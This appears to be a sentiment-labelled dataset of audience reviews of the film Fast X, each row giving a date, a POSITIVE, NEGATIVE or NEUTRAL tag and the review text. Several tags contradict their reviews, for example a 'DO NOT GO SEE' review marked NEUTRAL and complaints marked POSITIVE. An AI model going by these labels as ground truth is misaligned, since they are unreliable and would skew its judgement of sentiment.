"May 24, 2023",NEGATIVE,What a waste of time! The worst movie I've seen in a long time!
"May 24, 2023",POSITIVE,Always Love Fast Movies
"May 24, 2023",NEUTRAL,"If you go in knowing the previous movies and its over the top direction, then you know what to expect. Its quite the ride! Jason M. was the best part imo. Looks like he had a great time filming it. So the movie was enjoyable enough. But part of me, and many fans, really miss ""the streets"" and pink slip days."
"May 24, 2023",NEUTRAL,"This new entry to the Fast and Furious Saga brings laughs, chaos, and a whole lot of fun to the screen."
"May 24, 2023",NEUTRAL,"Basic F&F movie. We had time to kill, so we went to a matinee."
"May 24, 2023",POSITIVE,it was awesome and amazing
"May 24, 2023",POSITIVE,"I love the Fast franchise, but I still wasn’t sure what to expect for X, even with Momoa and Cena! It far surpassed any expectations I could’ve had though, and even though there was the typical over-the-top scenes we’ve come to expect from these movies, it was still incredibly well done! I LOVED IT!!! Bring on the next one!!!!!!! 😍"
"May 24, 2023",POSITIVE,A thrill ride from start to finish!  Amazing to see some old favorites!
"May 24, 2023",NEUTRAL,"The movie was one incredibly unlikely, ridiculous stunt-filled scene after another.  When it does get talky, the awful acting shows.  Jason Mamoa's character (characterization) is so annoying that I cringed every time he was on screen.  I've seen every movie in the series and it seems the goal is to out-landish the previous films.  Then, to top it off, it ends in the middle of the action.  I'm a fan of all the bad actors in the movie but enough is enough.  Very disappointing."
"May 24, 2023",POSITIVE,Great movie and loved the storyline.
"May 24, 2023",POSITIVE,"Just top all the other movies. Fast x was so enjoying, now on to the next movie, in this series."
"May 24, 2023",POSITIVE,I had anxiety the whole movie! it is intense and I can not wait for the next one!
"May 24, 2023",NEGATIVE,"Movie was pretty funny and really nice suspense and cgi, would have been at-least a 4/5 if I didn't get molested by a random guy half way through the movie."
"May 24, 2023",POSITIVE,Didn't like the last 1 min. Is there going to be another Fast X. What happened to Don and his son?
"May 24, 2023",POSITIVE,"The action was none stop, but it was obvious that the underlying theme was all about family.  So glad I stayed beyond the initial credits at the end for the surprise."
"May 24, 2023",POSITIVE,Fantastic!!! I watch it this morning all by myself without kids. Honestly speaking not very appropriate as PG-13 as too much violence actions but really amazing for adult audiences. One of the best movies of year 2023!
"May 24, 2023",NEGATIVE,The very best part of this movie was when it ended. The seats were comfortable and made for great napping experience. I took my time in the restroom cause I knew I wasn't going to miss anything. Go ahead and miss this flick maybe catch up on dishes or laundry.
"May 24, 2023",NEGATIVE,Good action movie ...its the same as the last 4 ...Jason Momoa is the highlight of the movie...its just getting old with the far fetched stuff
"May 24, 2023",POSITIVE,"This franchise never disappoints. I love that theyre leaning into being absolutely ridiculous. I wont lie, I do miss the racing roots that this franchise comes from. But I am enjoying the ride theyve created. And the fact they have characters that become meta and see how outlandish its become. Theyre essentially super heroes with extraordinary abilities and driving skills so god like they ignore all laws of reality. Which is why I go to the movies. Its a spectacle and while its not for everyone, it will find its audience. I came for the cars and I stayed for family."
"May 24, 2023",NEGATIVE,Movie drag at some points and way over the top but still a good time 
"May 24, 2023",NEGATIVE,"It was action packed but lacked any story holding it together. Mamoa was good. Visuals were good. Got to the end with no ending. That sucked, Story was so lacking already- that killed it completely for me."
"May 24, 2023",NEUTRAL,Very basic same action packed movie not enough storyline or content left in a cliffhanger for a sequel very poor acting Michelle Rodriguez looks too old to be in that movie anymore
"May 24, 2023",NEGATIVE,"The only reason I put two stars is for the acting of Jason Momoa. At least he acted the rest were either in a commercial or a video game. This movie is total corn and totally revolves around Vin Diesel, who couldn’t act his way out of a paper bag. John Cena gave it a good try. The little boy that played Vin Diesel’s alleged son was really awful. He must be someone’s friend or relative. The movie itself was nothing but fighting and total CGI and strayed way far away from car racing. Jordana Brewster, who weighs all of 100 pounds is in there with 3 to 5 swat soldiers in full dress with giant machine guns kicking their butts ha ha. Michelle Rodriguez should’ve stuck with machete. The entire movie was a cross between a comic book and a video game. "
"May 24, 2023",NEGATIVE,Typical Fast series story. illogical stunts....
"May 24, 2023",NEGATIVE,"The franchise is successful. It didn't need the addition of more big names for these two movies. I do think by the time the next one (second part of this) comes around I'll have forgotten everything but also I probably won't care. This movie switched me off, despite some really very good action scenes, it was not as good as the past couple have been. Unfortunately the ""twists"" were formulaic and easily foreseen (and one I didn't even care about), and the baddie seems much too hammy a performance. It's also too much to push on us so many enemies working together and the rising from the dead/ acting like people are dead (yawn, please let people just die already). These two are meant to be the end - and we would expect thrills and chases- but all they're going to do, unless the next one delivers, is damage their own good brand. It is entertaining for an afternoon or slow night but not one I'd watch more than twice (presumably I'll have to watch it again to remember the details so I can see the next!). But let's face it, they'll bank a lot of cash for the franchise and movie investors everywhere will stick with the ensemble known cast, too many stories going on and ott loved up teams, and we will all just keep buying the tickets 😗because - after all - we love Vin Diesel, fast cars, pretty people and Doms ""family""."
"May 24, 2023",POSITIVE,"Those of us who have enjoyed the past Fast and Furious movies will enjoy this one too. Action, fast cars, explosions, stunts that should not work but somehow do work in the movie...obviously it is not for everyone."
"May 24, 2023",NEUTRAL,"DO NOT GO SEE(NOT a GOOD MOVIE): ""Fast X""(2023,(RG-13))! (I went to see this movie at 12:00pm(CT) Sunday May 21, 2023; (in Austin, Texas(TX)).); (I wrote my comments here at 12:02pm(CT) Wednesday May 24, 2023.)"
"May 24, 2023",NEUTRAL,Lots of action.  Jason Mamoa played his part well.  Lousy ending though.
"May 24, 2023",NEGATIVE,"Asinine movie! What used to be a good franchise has turned into stupidity. Turetto’s son was born white in previous movie but was black for this movie. Brie Larson’s acting looked forced—-simply reading script lines, no acting ability. Momoa, painting his nails while sporting two girlish ponytail bobs and trying to mimic Joaquin’s Joker persona was…well a dumb copy cat version. The car action scenes used to be great but now they have gotten so ridiculously far fetched. The scene where Turreto’s small son jumps from one racing car to the other was pretty stupid. The whole movie is full of unbelievably stupid action scenes and riddled with poor acting abilities. And a surprise appearance from a character that died in a previous movie in this franchise?!? Throwing in big name actors to only give them 10-minutes of showtime?! Waste of money and time but I learned my lesson—-will not be watching any future sequels to this ridiculously dumb franchise!"
"May 24, 2023",NEGATIVE,"It follows the formulaic nonsensical-style the other F&F... it sells as a macho movie, still, manages to be SO CORNY that you will want to puck. Can someone just put a bullet in the head of Toreto so we can all forget the F&F trashy movies ever existed?"
"May 24, 2023",POSITIVE,It was a great movie!
"May 24, 2023",NEUTRAL,"I took my son to see this movie, because we have seen all the Fast and Furious movies out there. It was wild and on the crazy side of this kind of movie!! It was exciting and hope that they come out with an XI."
"May 24, 2023",POSITIVE,"starts out awesome, has a lot of unanswered questions through the movie but you will be so into the movie that you will be on the edge of your seat.. it's truly worth going to go see.. I enjoyed and am anxious for it to be on blu-ray so I can buy it and watch it again to see if I might have missed something special.."
"May 24, 2023",POSITIVE,After 10 movie the thrills is not the same but good movie whit action!!
"May 24, 2023",NEGATIVE,"Worsted movie I have seen in a couple of years.  Seemed like a very long trailer. They kept introducing new characters and then they disappear, just left hanging.  The movie didnt have an ending.  They acted like the next movie was coming out next week so you could find out how it ends.  Waist of time."
"May 24, 2023",POSITIVE,Outstanding.  Yes! Love this type of movie.
"May 24, 2023",POSITIVE,I loved the fact that the movie never disappoints with ACTION and AI TECHNOLOGY and the stunts are INSANE. They took us back to the beginning and that was amazing to see. My personal CON is Jason Mamoa ewwwwww he assumed the role of the Joker out of a Batman Movie and it was not cute to watch!!!! I also did not like the ending the cliffhangers didn't make me excited like all the others but I am looking forward to the next sequel with THE ROCK and I hope his daughter makes an appearance! Overall I'm a die-hard fan and I will continue to support!
"May 24, 2023",NEGATIVE,"Watchable 😒 Storyline was all over the place and too confusing; Too many unnecessary elements thrown in. Making Dantè a metro-sexual Joker took away from the masculine theme, and the end was lack luster. "
"May 24, 2023",POSITIVE,They continue to make them more fast and more furious! I hope this franchise never ends. Fun setup for the next movie. A lot of characters to juggle now but they do a decent job keeping everyone involved. 
"May 24, 2023",POSITIVE,LOOOOVVVVVEEEEEDDDDD IT!!! The best one in the series!!
"May 24, 2023",NEUTRAL,"Long, convoluted, too many characters to keep straight. Thought it was a Batman movie. Not a ""real"" movie at all--because there was no ending! And upon further investigation, Part 2 is still in development! Maybe a 3-hour edited version of parts 1 and 2 combined will ultimately be more satisfying. Photography sharp, compositionally well-planned. Color excellent and vibrant. Musical score intensifies the action and is well-used. One character's acting obviously delightfully over the top. The others all little too earnest, overly sentimental, and often too dewy-eyed and melancholy for its own good. Fun cameos throughout. 1950's ""Around the World in 80 Days"" type film for the car chase/espionage/criminally unhinged grudge scene."
"May 24, 2023",NEGATIVE,It's a cartoon that prints money at this point.  The story and writing are trash.
"May 24, 2023",NEUTRAL,"Alot of fighting, alot of car chases and crashes, fairly typical ""Fast"" movie.  They destroyed parts of Rome!  Guess they tried to include a lot of people from previous movies but to me their inclusions did nothing to the  story line, only made the movie longer...and I like Jason Statham and Helen Mirren (noting a few of these inclusers).  Best part of the movie were the rolls played by John Cena and Jason Momoa.  But what was the purpose of the guy unzipping from a bag (?) and high-tailing it out of there in his tighty-whities?  Several crashes were unrealistic especially the one on the bridge toward the end of the movie where there appeared absolutely no form of law enforcement showed up to control the situation.  Vin Diesel's close-up expressions throughout the movie made him look like he may have been a little confused about what was happening.  
All in all, it was a long movie and I was so looking forward to this being as good as the previous ones but, unfortunately I don't think it hit the mark....at least for me...sorry."
"May 24, 2023",NEGATIVE,"Momoa overacting, the dialogues was very vague, the jokes are awful…"
"May 24, 2023",POSITIVE,It’s what you expect from this franchise.  See it in 4D for maximum enjoyment
"May 24, 2023",NEUTRAL,Lots of action but it left a lot of loose ends
"May 24, 2023",POSITIVE,Worth every penny and does not disappoint.
"May 24, 2023",POSITIVE,This action thriller had me on my seat. The ending has me wanting more. So I assume that means well see Fast XI
"May 24, 2023",POSITIVE,"Incrível, e a Rocha esta voltando show!!!!!!!"
"May 24, 2023",NEUTRAL,"I would say this, it's slightly less crazy than the last one"
"May 24, 2023",NEGATIVE,Aquamans character was too much and ruined it for me
"May 24, 2023",POSITIVE,Not being told it was a trilogy
"May 24, 2023",NEUTRAL,"I liked the non-stop action. Some stunts were a bit cheap or sped up car scenes, but for the most part impressive and fun to watch. It seems it is the Never-ending Story though!"
"May 24, 2023",POSITIVE,As usual the stunt ridiculousness was on 10 ( lol pun intended) . At Some points in the movie the acting got a little hazy from some of the supporting characters. But overall a very enjoyable movie if you like fictional action! Hats off to Jason Mamoa for taking his role to an elevated level he brought the comedy for sure.
"May 24, 2023",NEUTRAL,Movie was good just ended badly.
"May 24, 2023",POSITIVE,Very Exciting...Loved it...Love all Fast movies....
"May 24, 2023",NEGATIVE,"Jason Momoa made the movie other than that big budget,  big names it was all showy but no talk basically.  Took a while to get into but definitely a pass time thing ."
"May 24, 2023",POSITIVE,Excellent!!! Can't wait to see part 2.
"May 24, 2023",NEGATIVE,Too much unrealistic action and Stant
"May 24, 2023",POSITIVE,"Me gusto que tengan tambien funcion en español, y muy. Uena la película."
"May 24, 2023",POSITIVE,"Great fun! Plenty of exciting action, funny dialogue and famous faces. Mamoa definitely steals the show as the quirky villain. Why we go to the cinema is to see movies like this.
Doesn't take itself too seriously."
"May 24, 2023",POSITIVE,Just fun pure popcorn fun!!! Next one better hurry up that ending was messed up y'all kmow what y'all did 😂😂😂👍🏽👍🏽👍🏽🔥🔥🔥
"May 24, 2023",NEUTRAL,Lots of action that was over the top. No main story to follow as its all over the place having previous characters appearing that makes it confusing. Hard to have emotion as movie ends with no closure to the story so its obvious there will be probably few more series.
"May 24, 2023",NEUTRAL,"I wanted this to be the best Fast movie ever. I recently went back and binged through everything. They all hold up. I love this series, hook it to my veins. 

It just wasn't though. I felt like there's a little too much liberal CGI usage. I love the campy action and that stuff was here but there was just a few too many times where the cgi was really obvious imo. 

I hate to say it too but I thought the kid sucked. Either I didn't like his acting or the scripting was really bad. He seemed pretty wooden and I thought so many of the scenes with him and Vin especially felt like there was no dialogue, it was all just one liners being spoken. 

Now, with that being said. Momoa might be the best ancillary character in any of these movies. His performance is totally unhinged. I'd love to have heard what direction he was given cuz if they said ""play the joker, only louder"" I wouldn't be surprised. He's androgynous, he's insane, he's calculating, he's deceptive, he's deranged, he's bombastic, he's outlandish…it's just an awesome performance and it only grows on you as the movie goes along. At first I was like ""strange clothes"" or ""why is he sort of dancing"". But then it gets bigger, and he keeps adding to it. And it's absolutely like a Heath Ledger joker type performance in my eyes. I hope I'm not overselling it, but I wanna rewatch this just for More Momoa."
"May 24, 2023",NEGATIVE,"Wow! This kinda stunk, this movie series should have finished a few movies ago."
"May 24, 2023",POSITIVE,This movie was awesome!! Loved every min of it.
"May 24, 2023",POSITIVE,"Amazing movie. Lots of action scenes, and unlike a lot of movies recently, it was not predictable. I loved it."
"May 24, 2023",POSITIVE,We loved the ridiculous action in the 80s.. same thing
"May 24, 2023",POSITIVE,"Loved this movie. Easily the best Fast movie since Fast 7. Part 8 and 9 were probably the two worst movies of the series, but part 10 is a fresh return to the fun Fast franchise. They didn't go as overboard in this one as the past few movies have, but it was still ridiculous fun. Can't wait to see what the final two movies hold for us fans, after the 2 cameos in this one."
"May 24, 2023",NEGATIVE,"Way too unbelievable... I went to sleep, I didn't fall asleep lol, but my husband pushed through since there was only about 30 minutes left to go. He said he lost interest in the first 30 minutes, especially after the crane scene, but he was making remarks about the tires still being in tact just prior to that. There was no excitement or rooting for anyone, at any time, because the story was boring. I gave it 2 stars because we stayed."
"May 24, 2023",POSITIVE,"overall i enjoyed this movie, it was more realistic than the one before. i look forward to the next part"
"May 24, 2023",POSITIVE,loved the movie worth it !
"May 24, 2023",POSITIVE,Very good performance of Jason Momoa.
"May 24, 2023",POSITIVE,Great actors all. Action packed.
"May 24, 2023",POSITIVE,Jason Momoa was a funny villain 🤣
"May 24, 2023",POSITIVE,Plot twist crazy loved it!
"May 24, 2023",POSITIVE,Theyve done it again! Its really good!
"May 24, 2023",POSITIVE,I like the whole movie but I don’t like people who is sacrifice in the movie 😭
"May 24, 2023",NEGATIVE,The ending was horrible!.
"May 24, 2023",NEGATIVE,Action was good but the plot was a train wreck
"May 24, 2023",NEUTRAL,It’s a surprisingly fun film. Corny but very fun.
"May 24, 2023",NEGATIVE,The worst fast and furious movie I ever seen.
"May 24, 2023",POSITIVE,The movie was great! Starts right off with action and seating in the 4DX seats made it even better. Seriously I don’t think I can do normal movie seats again.
"May 24, 2023",POSITIVE,Lots of action from the start. 10/10 recommend watching in D-BOX
"May 24, 2023",NEGATIVE,Ok so i bought this tickets to the wrong movie theater I try to canceled but it wouldn’t let me other than that the movie was great but I have to buy new tickets at the right movie theater
"May 24, 2023",POSITIVE,This is a movie you must watch !!
"May 24, 2023",POSITIVE,"It was more diverse with women having action parts. In addition, I like the location for the filming."
"May 24, 2023",POSITIVE,can't wait for pt 2 and 3
"May 24, 2023",POSITIVE,It was pretty good. It’s just it’s kinda confusing
"May 24, 2023",NEUTRAL,Too much action.  Too violent.  Actors all did a very good job.
"May 24, 2023",NEUTRAL,"I genuinely have no business reviewing Fast X. I'm not a big fan of the Fast and Furious movies, and really only saw this one because I was curious to see how truly ridiculous this one would be after F9 took some of its characters to space IN A CAR. Needless to say, I don't think very highly of these movies to begin with. 

On the positive side… it's a little better than the last few movies, and a little less crazy and ridiculous. However on a more negative note… it's an absolutely horrendous garbage movie; it's a complete mess of a film. But… I don't regret watching it because I had a completely good time while the movie was on screen. I was dying of laughter for most of the film alongside my friends — the movie was hilarious…ly bad. Alas, we were all laughing AT the movie, not with it. It would have been fine if this movie was intended as a comedy… but the fact it asks us to take it seriously when it's essentially an unintentional self-parody of the franchise makes it quite problematic. It's a fast-food movie, and quite forgettable, but I can't say I wasn't entertained while watching it.

But you can be entertained while recognizing the movie you are watching is absolutely a piece of crap at the same time. The only reason I gave it this high a rating is because of how good a time it let me have with my friends. I can guarantee if I was to have watched this alone… I would rate it much lower.
I know I am part of the problem here, but I really hate that audiences today are so accepting of movies that really don't try. This movie is so ridiculous and stupid that it is entertaining, but it has absolutely no story, no characters, and nothing to care about to back up the mindless action we see on screen. Why do we assume you can only have one or the other? Why do we just accept being given one or the other? We can have a good movie with strong writing while also having great, bombastic action! For example, Mission: Impossible - Fallout, or even Captain America: Civil War gave us riveting narratives, wonderful twists and turns that made sense, multi-dimensional, layered characters with beautiful inter-character conflicts and they did all of that while also giving us big bombastic set-pieces, great action, and great fights. So I don't know why when it comes to this franchise we as film audiences just accept being handed half-assed mediocrity. I expect better. Heck, in the last year we've seen better: John Wick 4, Guardians of the Galaxy Vol. 3, Top Gun: Maverick, or even Avatar: The Way of Water. I would love to enjoy Fast X as the filmmakers intended me to, but I can't when all they offer is mindless, ridiculous action with no semblance of depth, story, or character. They gave me absolutely no reason to care. If they want me to enjoy it as a comedy, fine — then I'd say this was an effective movie. But the fact that they ask us as the audience to take it all seriously… it makes me truly want to laugh at the movie. Because they didn't do the work to earn my emotion, my attention in that regard. Sure, there were redeeming qualities and I had a good time laughing at it with my friends, but that doesn't let them off the hook for making a terrible movie.

I mean, when half your movie is shot without a director, and when you eventually hire one, you only give him 3 days to prepare before shooting… I don't know what else you expect to get besides a mess. This film was probably doomed from the start, and even if Louis Leterrier did try his best to save the film, there is absolutely no way he could have saved it with the circumstances he was put in. Considering those circumstances… maybe this is a decent film. But it shows why movies need a director at the helm — it is very clear that many sequences here were shot without clear direction and vision. They are all over the place, with many different tones and visual languages. It really feels like an instance where there were too many cooks in the kitchen, and that is likely because Leterrier was brought on too late. The film is just all over the place and I can't say it ever felt cohesive. Plus, as part 1 of a larger story, it falls into all the traps that a part 1 could: it's all set up, no resolution, it has really dumb twists leading to an unbelievable cliffhanger that I couldn't take seriously, and most of the plotlines in the movie just felt like filler. It also really tried to copy the Infinity War template, splitting up the crew into groups on different ""missions"" (I say it in quotations because really only Dom had a plot where he had to do things, the rest of the characters were just running). The story as a whole is nonsensical and is riddled with plot holes and misleading moments that don't make sense when the twists are revealed. It also has some pretty horrible dialogue… like Star Wars prequel levels of awkwardness. Even the humour didn't land. At least the action was exciting again, even if it was still quite silly and ridiculous. (The crane scene in Rome had me howling… you'll know it when you see it).

BUT… Jason Momoa was goddamn fantastic in this movie! He was the highlight for me, and would be one of the only reasons I'd ever rewatch this one! Momoa knows what kind of movie he's in from the start (seems to be the only cast member who knows), and he just has fun with the role! I loved how he played it, not taking it overly seriously and delivering one of the best and most memorable villains in the franchise because of this. I loved his energy and how bonkers of a performance he gave — despite giving a very silly performance, he commanded the screen with it! If only more of the cast could have fun with it like Momoa did!

I'm finishing writing this review a day after I saw Fast X… and I gotta say… I can barely remember what happened. It's a very forgettable movie that left no lasting impression on me. For a movie that cost $340 million to make (where'd that money go??), you'd think it would have offered up something so incredible, so memorable. Instead… it's just 2 and a half hours of mediocrity that is really only fun if you're with a group of friends. Sure, it might be the best since Furious 7, but that's not a very high bar to beat. The movie is pretty bad.

Maybe Part 2 can be better… but at this rate, I don't have high hopes.

And yet, I know I'll be there with a group of friends laughing at the ridiculousness on screen, just like with this one.

It's really the only way to get through these movies."
"May 24, 2023",POSITIVE,"Always great action, unrealistic but entertaining"
"May 24, 2023",NEGATIVE,It was toooo scripted. Really no storyline. Watched because I’m loyal. Bae felt the same.
"May 24, 2023",NEGATIVE,Waaay over the top... So much that its silly. Cringy acting and plot twists that you can see from miles away 🤦🏻‍♂️
"May 24, 2023",POSITIVE,I loved the car scenes but the action was legendary!!!
"May 24, 2023",NEGATIVE,"The previous fast and furious movies were plot based.  The villains had some maturity.  The plot in this movie was not well developed.  Throwing big name stars at a movie does not make that movie a 5-star attraction.  Too many times the movie went back and forth with too many behind the scenes stories.  This made the movie boring at times and at others was just out and out bad fantasy that led to the final scene wondering why Hollywood is trying to remake movies using old versions of the original movie.

The end is very disappointing and lacked the ultimate climax.  If I could try to get a refund I would."
"May 24, 2023",POSITIVE,I just loved Jason Momoa character. He’s so annoyingly funny 😄 and good villain . The storyline was amazing I can’t wait for the 11th
"May 24, 2023",POSITIVE,A MUST SEE MOVIE. TOO much action. Love it. 
"May 24, 2023",POSITIVE,It was awesome! Plot twist after plot twist!
"May 24, 2023",NEGATIVE,At this point they need to let it go. This was full of action but the ending was trash!!!!!
"May 24, 2023",POSITIVE,"LOVED IT! A Non-Stop, action packed movie with some absolutely amazing stunts!"
"May 24, 2023",POSITIVE,"Esta muy buena, recomendable...la mejor de este año."
"May 24, 2023",POSITIVE,I always love the Fast and Furious movies. This one a little over the top but fun to watch. I waiting on part II.
"May 24, 2023",POSITIVE,"You know what your in for with this franchise Cars, loud music, over the top unbelievable action and most importantly..... Family. Great start to an epic 3 part finale."
"May 24, 2023",POSITIVE,Another great fast and furious movies can’t wait for the next one
"May 24, 2023",POSITIVE,we love it. full of action through out the movie
"May 24, 2023",NEGATIVE,This is one of the absolute worst movies I have seen in a long time the plot was terrible. Jason Momoa‘s character was terrible. The car scenes were absolutely ridiculous. I highly recommend. You don’t see this movie
"May 24, 2023",POSITIVE,Dante for me was the best part of the whole movie
"May 24, 2023",POSITIVE,After the Fate of the Furious and F9 The Fast Saga poor films. Fast X has proven that there is still lots of gas in the tank. Jason Momoa is the best villain we have ever had in this franchise charismatic and ruthless I love the combination and so do the fans. The Action was great and the end credits give us hope and a reason to see the next instalment 
"May 24, 2023",POSITIVE,"Off to a good start, kept racing aspects in the movies, less action but still action packed."
"May 24, 2023",NEGATIVE,"I have never written a review for a movie on here. This is honestly one of the worst movies I have ever seen. I cannot believe that adults wrote this movie. It felt like 12 year olds made this script. So corny and just flat awful. The story, the acting, the writing, and it seems as if the actors do not believe they need to act. Every line is delivered with zero effort. Vin and Cena are terrible in this. Brie Larson……wow, it's quite amazing she can literally gets shot and is smiling in the very same seen as if nothing happens. It's horrible, horrible, horrible. I cannot believe people like this."
"May 24, 2023",NEUTRAL,"Its a fun watch , i liked it .jason momoa’s screen presence is a treat to the eyes ❤️🔥."
"May 24, 2023",POSITIVE,The movie FAST X is great lots of Action and F amily Values from the Beginning to END.
"May 24, 2023",POSITIVE,"Utterly bananas just strap in and enjoy the ride! No, the action sequences are not physically possible and over-the-top. That's what makes it so good. stay for the post credit. You're welcome!"
"May 24, 2023",POSITIVE,Cheesy but always a classic
"May 24, 2023",POSITIVE,It had everything you would expect from the franchise except I’m not looking forward to waiting another couple of years for the next one.
"May 24, 2023",NEGATIVE,Two hour waste of life with no conclusion!!! The villain was weird and annoying.
"May 24, 2023",NEUTRAL,"As always, over the top stunts and fighting where people somehow don't tend to get hurt. What I disliked most about it was the abrupt ending. I get they are still making more, but it could have ended better to lead up to the reveal that there will be a next one and the Rock is back. As well, some of the directing was bad. Jason's character was too much at times. Mad certain parts corny."
"May 24, 2023",POSITIVE,It had lots of humor and was really packed with awesome action scenes. There were some very hilarious jokes cracked. Good movie overall.
"May 24, 2023",NEGATIVE,"Bad script, bad acting, bad plot, bad CGI, and tedious action sequences"
"May 24, 2023",POSITIVE,"I thought it was good, especially if you've watched the movies from the beginning. Lots of cameos and surprises. Good car chases and races. Make sure to stay after the main credits."
"May 24, 2023",POSITIVE,Great addition to the franchise. Excellent action sequences. Jason Momoa is a great villain. Definitely recommend this.
"May 24, 2023",POSITIVE,I would like to say it is that … the fast and the furious never let you down ❤️❤️❤️❤️😜
"May 24, 2023",POSITIVE,Exciting. Fast paced. Evil guys played well.
"May 24, 2023",POSITIVE,BEST MOVIE IN YEARS! SO MANY TWIST AND TURNS
"May 24, 2023",POSITIVE,"This movie was SO AWESOME!!  I am going to see it again, but the dvd, and I can’t wait for the installment."
"May 24, 2023",POSITIVE,"It's like the return of the 90's blockbuster. Doesn't need to be scientifically on point, but it hits deep and rocks hard."
"May 24, 2023",POSITIVE,I love this whole franchise.  The action is always amazing and the always have some surprises in these movies!!
"May 24, 2023",POSITIVE,Very explosive. All of the actors were excellent.
"May 24, 2023",NEGATIVE,The story has grown stale and dead characters keep coming back to life. 
"May 24, 2023",NEGATIVE,Only went to see this movie because my girlfriend likes cars. It was way too boring and predictable. Action scenes and set pieces were cool everything else like the quips and music were bad.
"May 24, 2023",POSITIVE,It kept me on the edge of my seat. The special effects were over the top. Jason Mamoa makes a for a truly psychotic villain.
"May 24, 2023",POSITIVE,"This movie was awesome!!!  The storyline, cast, action, all amazing!!"
"May 24, 2023",POSITIVE,Love love love it. Full of action from beginning to end.
"May 24, 2023",NEGATIVE,The movie was so predictable and with bad acting. At least has some funny parts. But I don't recommend wasting money watching it. Wait to see it on Max or cable.
"May 24, 2023",POSITIVE,"Just watched movie with my wife and we both loved it. Great action, a roller coaster ride to the end. We don't want to wait 2 years to find out what happens. Highly recommend if you're a fast and furious fan or an action movie fan."
"May 24, 2023",POSITIVE,Non-stop excitement.
"May 24, 2023",POSITIVE,Action packed very very good
"May 24, 2023",POSITIVE,"Great fun Summer movie with great cast. Momoa was a great addition to the franchise. I think Fast 9 was weak and slow. This one was enjoyable, and now that the Rock is back, were all excited!!👍"
"May 24, 2023",POSITIVE,It was a great movie ..way better than the last one.. worth watching..can’t wait for the next one 
"May 24, 2023",NEUTRAL,It's pretty fun but to many sub plots to handle for this magnitude and it can often leave me confused at some points
"May 24, 2023",POSITIVE,Never failed to disappoint.
"May 24, 2023",NEGATIVE,It’s beginning to be a marvel movie. So unrealistic
"May 24, 2023",NEUTRAL,Its a wild ride! Entertaining and unbelievable! But fun and funny!!
"May 24, 2023",POSITIVE,"I Thought it was awesome. 
I love to race my car  
Haha!!"
"May 24, 2023",POSITIVE,Ya know it ain’t bad. Jason Mamoa has great energy so that made it good!
"May 24, 2023",POSITIVE,It was great!! Cannot wait for the rest of the trilogy!!
"May 24, 2023",NEGATIVE,"Ive liked most of the series, but this one was a stinkeror maybe just not the right demograph?   They stretched the unreal thing a bit too far this time  And the acting seemed contrived, corny and unbelievable.I think even an 8 year old would would say the same about that!"
"May 24, 2023",POSITIVE,"Okay so this is actually a great movie. Obviously suspend your beliefs and leave that stuff at the door but I thought this movie helped save the franchise. It brought the plot and characters back down to earth (from space, literally…) and refreshed its characters, somehow making them more likeable than they were before. The chemistry between Charlize Theron and Michelle Rodriguez was fantastic, making Cipher's character so much more fun to watch. 

They made the effort to give Jason Momoa's villain a back story and are actually investing screen time in making him a proper villain. He isn't just bad to be bad - he's got a purpose and reason, and is genuinely maniacal. His character was Joker meets Jason Statham. The scene with the margaritas and painting the henchmen's toes was T W I S T E D and I couldn't believe they actually went there. 

While I don't think this end-of-franchise plot can stretch to THREE parts (Oof lol) I am definitely looking forward to seeing where they go with the plot and how they end off these characters."
"May 24, 2023",POSITIVE,ALL OF IT!!!! HUGE FAN!!!
"May 24, 2023",NEGATIVE,Horrible movie!!! Not one flat tire in any of the “good guy stunts” I’m over the fast and the horrible franchise
"May 24, 2023",POSITIVE,"awesome, action packed movie"
"May 24, 2023",NEUTRAL,"not bad but, but not as hooked on these movies as I was the 1st 3"
"May 24, 2023",POSITIVE,"These movies are so goddamn fun idc if you're sick of the family stuff or if the stunts are too wild they're fun and they're entertaining and I think I'm going to go see it for a second time sometime this week—that's how much I like this. 

(but seriously. it's the tenth. i think we'd know by now if they were trying to be 100% serious. they're not, and it would be boring af anyway.)"
"May 24, 2023",NEUTRAL,"It’s a funny movie because of Dante also have a cool story, but it’s not the original fast and the furious"
"May 24, 2023",NEGATIVE,"The worst of the fast movie, horrible, a waste of money, but Jason Momoa's wana be joker was somewhat weird but funny at times , so all and all the movie was super bad for bad"
"May 24, 2023",NEUTRAL,"Fast X give to us a random and stupid but awesome movie that we can enjoy in family or friends, the story is so weird that the people love it."
"May 24, 2023",POSITIVE,"Awesome, can’t wait until the next one. I want to watch it again!"
"May 24, 2023",POSITIVE,A Definitely Absolutely Must See !
"May 24, 2023",NEUTRAL,"This was actually a good movie, a few unrealistic scenes  that could literally only happen on the smallest of chances BUT visually ? Great & the story was well written."
"May 24, 2023",POSITIVE,Awesome! Amazing! Action Packed! loved every minute!
"May 24, 2023",NEUTRAL,You really need to leave your brain at home to enjoy this movie.
"May 24, 2023",POSITIVE,"Dont like we have to wait 2 years to find out if he gets letty back.  If Ludachris. Roman and Ramsey come out alive 

Too Many ifs"
"May 24, 2023",NEGATIVE,Made no sense and cgi was all over the place
"May 24, 2023",POSITIVE,Loved it cant wait for the sequel. Too bad Jason Stratham didnt have a bigger role.
"May 24, 2023",NEUTRAL,"Movie went good and all, but we didn’t get to finish the movie because of a thunderstorm and we wait 25 minutes still didn’t start back up"
"May 24, 2023",POSITIVE,"Nothing to dislike,it was awesome!"
"May 24, 2023",POSITIVE,That was a GREATTTTT MOVIE!!!! 10 stars
"May 24, 2023",POSITIVE,Jason Mamoma’s flamboytant villian is enough for me! Just don’t redeem him in the next movie
"May 24, 2023",NEUTRAL,We enjoyed every minute of the movie. But we don’t like the Feminization of Jason the evil character. We are all sick and tired of the woke agenda and movies and Hollywood needs to stop.
"May 24, 2023",POSITIVE,Nice movie but seem little over the top
"May 24, 2023",NEGATIVE,"Very little plot, all car crashes that defy survival."
"May 24, 2023",POSITIVE,I liked the end cutscene it was good and the movie itself as well.
"May 24, 2023",NEGATIVE,Momoa's role was not good for him. I didn't like his acting at all. I think they need to stop making these series in particular.
"May 24, 2023",NEUTRAL,Disliked the ending of the movie!
"May 24, 2023",POSITIVE,"Held my interest. A lot of action, just what I was looking for!."
"May 24, 2023",POSITIVE,Awsome ! Even if u haven't seen all the movies as long as uve seen the first few youll understand. Only down fall is.. is that it's a f 2 part!!   But OMG was the ending was  !!  Ugh!! Ya can't wait for part 2 !!
"May 24, 2023",NEUTRAL,I was confused about what the end of then movie showed for the characters .  I enjoyed the movie but it left me confused.
"May 24, 2023",POSITIVE,"Pure adrenaline rush!!! Fast Five is my favorite movie of the series (tied with the 1st) so I loved that the main antagonist was derived from that film. Jason Mamoa as Dante was hilarious, chaotic and maniacal! A ton of funny moments and heartfelt ones. I cant wait until part 2 comes out to see this crazy end to this great franchise!"
